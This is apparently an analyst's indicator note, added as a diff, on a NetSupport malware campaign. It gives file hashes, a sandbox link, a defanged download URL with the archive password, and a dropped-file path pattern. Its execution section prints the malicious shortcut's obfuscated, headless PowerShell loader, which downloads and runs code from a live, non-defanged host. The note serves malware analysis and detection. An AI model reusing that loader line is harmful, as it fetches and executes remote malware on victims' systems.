@@ -1,0 +1,35 @@
+NetSupport | 2022.08.12
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.zip 6D6D29B326591D2C052148A8882B8FD332F6360A16F32252D97A7BB884C2E520
+.lnk 6057C8BE3563721EF6EB36AEC23AC10C9DBE34DBF40AA1D9B04BF5319920F60B
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://private.tria.ge/220818-y2ldmarxwf/behavioral2#report
+
+
+# --------------------------------------------------------- #
+# ---------------------- CREDENTIAL ----------------------- #
+# --------------------------------------------------------- #
+hxxps://drive.google[.]com/uc?id=1C09WGmzM5fwR6m3PVA07S1JK0rA5bKfd&export=download
+password == 38715
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+.zip 
+    .lnk
+        TARGET== C:\Windows\system32\conhost.exe  --headless powershell -c $io=$([char](226-121));set-alias a set-alias;a f $io'wr';a np $io'ex'; ;np (f -usebasicparsing 'djue.fun/k')
+        .ps1
+        $io=$([char](226-121)); set-alias a set-alias; a f $io'wr'; a np $io'ex'; np (f -usebasicparsing 'djue.fun/k')
+            [
+                drops %AppData%\random 8 digit directory name\random 8 digit exe name
+                i.e. -- "%AppData%\\\w{8}\\\w{8}\.exe
+            ]
+
+
